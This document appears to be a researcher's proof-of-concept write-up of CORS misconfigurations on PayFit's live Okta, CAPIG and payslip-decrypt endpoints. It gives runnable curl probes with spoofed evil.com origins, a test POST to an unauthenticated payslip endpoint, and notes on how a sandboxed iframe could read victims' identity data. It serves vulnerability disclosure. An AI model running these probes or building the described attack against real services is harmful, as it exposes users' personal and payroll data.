PoC 1 — Okta Userinfo: Null Origin Reflected CRITICAL

Endpoint GET https://payfit.okta.com/oauth2/v1/userinfo
What this proves

The Okta userinfo endpoint reflects Origin: null with Access-Control-Allow-Credentials: true.
A sandboxed iframe on any website sends Origin: null — so an attacker on any domain can make a credentialed cross-origin request to this endpoint and read the response when the victim is logged into PayFit Okta.

Note: Without a live victim session the response body is 401 — but the CORS headers proving the misconfiguration are returned regardless of session state.

Unlike api.payfit.com which restricts to *.payfit.com subdomains, the CAPIG gateway reflects any origin at all with credentials — including this page's origin (agentprime-bob.github.io). No XSS or subdomain takeover needed.

PoC 3 — Payslip Endpoint: Unauthenticated Access + CORS HIGH

Endpoint POST https://api.payfit.com/qrcode/payslip/decrypt
What this proves

Every endpoint on api.payfit.com returns 403 RBAC: access denied without authentication — except this one, which returns 400, meaning it processes the request. Additionally, CORS reflects any *.payfit.com origin with credentials.

CORS Proof (curl — copy and run) 
# Payslip CORS reflects *.payfit.com with credentials — run this locally:
curl -sv -X OPTIONS "https://api.payfit.com/qrcode/payslip/decrypt" \
  -H "Origin: https://evil.payfit.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: content-type" 2>&1 | grep -i "access-control"

# Expected output:
# access-control-allow-credentials: true
# access-control-allow-origin: https://evil.payfit.com
# access-control-allow-methods: POST,GET,HEAD,PATCH,DELETE,OPTIONS,PUT
# access-control-allow-headers: content-type

Curl Evidence — Confirmed at Time of Research

PoC 1 — Okta Null Origin (curl) 
curl -sI "https://payfit.okta.com/oauth2/v1/userinfo" -H "Origin: null"

Response headers:
  HTTP/2 401
  access-control-allow-origin: null          ← reflects null
  access-control-allow-credentials: true     ← credentials allowed
  access-control-expose-headers: WWW-Authenticate
  vary: Origin

Impact: Any sandboxed iframe (<iframe sandbox="allow-scripts">) can make a
credentialed GET to this endpoint. When victim has active Okta session,
response body contains name, email, admin group memberships.
PoC 2 — CAPIG Arbitrary Origin (curl) 
curl -sv -X OPTIONS "https://capig.payfit.com/capi/test/events" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" 2>&1 | grep -i "access-control"

Response:
  HTTP/2 204
  access-control-allow-credentials: true     ← credentials allowed
  access-control-allow-origin: https://evil.com  ← reflects evil.com
  access-control-allow-methods: POST

Impact: Any website (no *.payfit.com needed) can make credentialed
cross-origin requests to the CAPIG conversion API gateway.
PoC 3 — Payslip Unauthenticated + CORS (curl) 
# Step 1 — Prove endpoint is unauthenticated
curl -s -X POST "https://api.payfit.com/qrcode/payslip/decrypt" \
  -H "Content-Type: application/json" \
  -d '{"tokenId":"507f1f77bcf86cd799439011","secret":"test","pin":"000000"}'

Response: {"statusCode":400,"message":"QR code token not found"}
                                                ↑ processed, NOT 403 blocked

# Step 2 — Compare with any other protected endpoint
curl -s "https://api.payfit.com/users"
Response: {"statusCode":403,"message":"RBAC: access denied"}
